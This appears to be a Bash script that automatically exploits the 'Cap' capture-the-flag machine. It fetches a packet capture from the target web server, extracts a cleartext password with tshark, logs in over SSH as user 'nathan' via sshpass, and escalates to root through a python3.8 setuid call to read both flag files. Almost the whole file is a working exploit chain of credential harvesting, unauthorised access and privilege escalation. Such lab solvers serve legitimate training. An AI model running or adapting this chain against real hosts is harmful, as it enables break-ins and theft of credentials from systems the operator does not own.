#!/usr/bin/env bash

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "${redColour}[!]${endColour} ${grayColour}Exiting...${endColour}"
  exit 1 
}

trap ctrl_c SIGINT

echo -e "\n${blueColour}---------------------------${endColour} ${greenColour}Welcome to cap machine${endColour} ${blueColour}---------------------------${endColour}\n\n"
echo -e "\t${greenColour}[+]${endColour} ${grayColour}Starting all...${endColour}\n\n"

if [[ -n "$1" ]]; then
  if [[ "$1" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
    timeout 1 ping -c 1 $1 &>/dev/null
    code_status=$?
    if [[ "$code_status" -eq 0 ]]; then
      if [[ -e "0.pcap" ]]; then
        echo -e "\n${blueColour}---------------------------${endColour} ${greenColour}Providing you the data${endColour} ${blueColour}---------------------------${endColour}\n\n"
        password=$(tshark -r 0.pcap | grep "PASS" | awk 'NF{print $NF}')
        user=$(sshpass -p $password ssh -o LogLevel=QUIET nathan@$1 "whoami" )
        user_flag=$(sshpass -p $password ssh -o LogLevel=QUIET nathan@$1 "cat user.txt" )
        root_flag=$(sshpass -p $password ssh -o LogLevel=QUIET nathan@$1 "python3.8 -c 'import os; os.setuid(0); os.system(\"cat /root/root.txt\")'" )
        echo -e "\t${greenColour}[+]${endColour} ${grayColour}User:${endColour} ${purpleColour}$user${endColour}"
        echo -e "\t${greenColour}[+]${endColour} ${grayColour}Flag:${endColour} ${purpleColour}$user_flag${endColour}"
        echo -e "\t${greenColour}[+]${endColour} ${grayColour}Password:${endColour} ${purpleColour}$password${endColour}"
        echo -e "\n\n\t${greenColour}[+]${endColour} ${grayColour}User:${endColour} ${purpleColour}root${endColour}"
        echo -e "\t${greenColour}[+]${endColour} ${grayColour}Flag:${endColour} ${purpleColour}$root_flag${endColour}"
      else
        echo -e "${redColour}---------------------------${endColour} ${grayColour}Warning${endColour} ${redColour}---------------------------${endColour}\n\n"
        echo -e "\t${redColour}[!]${endColour} ${grayColour}You dont have the 0.pcap file, do you want it?${endColour}\n"
        read -p "[+] [yes/no]: " response
        if [[ "$response" =~ (^|[[:space:]])(yes|YES)($|[[:space:]]) ]]; then
          curl http://$1/download/0 --output 0.pcap
        elif [[ "$response" =~ (^|[[:space:]])(no|NO)($|[[:space:]]) ]]; then
          echo -e "${blueColour}---------------------------${endColour} ${grayColour}Ending the program${endColour} ${blueColour}---------------------------${endColour}\n\n"
          echo -e "${redColour}[!] The program $0 could not continue due to :: missing files: '0.pcap' ${endColour}"
        else
          echo -e "\t\n${redColour}[!] You have to write [yes|no|YES|NO] Those are the options :)${endColour}"
        fi
      fi
    else
      echo -e "${redColour}---------------------------${endColour} ${grayColour}Warning${endColour} ${redColour}---------------------------${endColour}\n\n"
      echo -e "${redColour}[!] There was a problem solving the IP with ping commmand${endColour}"
    fi
  else
    echo -e "${redColour}---------------------------${endColour} ${grayColour}Warning${endColour} ${redColour}---------------------------${endColour}\n\n"
    echo -e "${redColour}The format of the ip is incorrect${endColour}"
  fi
else

  echo -e "${redColour}---------------------------${endColour} ${grayColour}Warning${endColour} ${redColour}---------------------------${endColour}\n\n"
  echo -e "${redColour}[!] You have to write the ip${endColour}"
  echo $1

fi
